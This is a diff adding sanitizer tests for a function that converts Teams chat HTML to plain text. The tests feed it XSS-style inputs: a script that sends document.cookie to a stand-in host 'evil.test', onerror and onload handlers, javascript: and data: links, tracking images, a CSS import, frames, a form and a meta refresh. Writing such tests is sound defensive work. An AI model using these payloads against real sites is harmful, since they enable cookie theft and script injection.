@@ -59,6 +59,42 @@ describe('converting Teams HTML to plain text', () => {
     expect(teamsText('<p>Caf&#233;&nbsp;at&#x20;noon</p>')).toBe('Café at noon');
   });
 
+  // Hostile markup a Chat message might carry: none of it survives as markup, no address it would
+  // load or run is kept, and only web and mail links keep their address.
+  it.each([
+    ['a script', '<p>Hi</p><script>fetch("https://evil.test/?c="+document.cookie)</script>', 'Hi'],
+    // Not a script to Commander: its words stay, as words.
+    ['a script split across tags', '<p>Hi<scr<script>x()</script>ipt>y()</p>', 'Hix()ipt>y()'],
+    [
+      'an event handler',
+      '<p onmouseover="steal()">Hover</p><img src=x onerror="steal()">',
+      'Hover\n\n[image]',
+    ],
+    ['an SVG with onload', '<svg onload="steal()"><circle r="5"/><script>x()</script></svg>Shape', 'Shape'],
+    ['a remote image', '<img src="https://evil.test/pixel.png?u=sam">', '[image]'],
+    [
+      'a srcset image',
+      '<picture><source srcset="https://evil.test/a.png"><img src="b.png"></picture>',
+      '[image]',
+    ],
+    ['a javascript: link', '<a href="javascript:alert(1)">Click me</a>', 'Click me'],
+    ['an encoded javascript: link', '<a href="&#106;avascript:alert(1)">Click</a>', 'Click'],
+    ['a data: link', '<a href="data:text/html,<script>x()</script>">Open</a>', 'Open'],
+    ['a CSS import', '<style>@import url("https://evil.test/a.css")</style><p>Styled</p>', 'Styled'],
+    ['an inline style', '<div style="background:url(https://evil.test/b.png)">Box</div>', 'Box'],
+    ['a frame', '<iframe src="https://evil.test"></iframe><object data="x.swf"></object>Framed', 'Framed'],
+    ['a form', '<form action="https://evil.test"><input value="secret"><button>Go</button></form>', 'Go'],
+    ['a meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.test">Moved', 'Moved'],
+  ])('drops %s', (_name, html, text) => {
+    const out = teamsText(html);
+    expect(out).toBe(text);
+    expect(out).not.toMatch(/evil\.test|javascript:|data:/i);
+  });
+
+  it('keeps entity-escaped markup as the literal text it is', () => {
+    expect(teamsText('<p>&lt;img src=x onerror=alert(1)&gt;</p>')).toBe('<img src=x onerror=alert(1)>');
+  });
+
   it('keeps plain text bodies as they are, trimmed', () => {
     expect(teamsText('  plain <b>text</b>  ', 'text')).toBe('plain <b>text</b>');
   });
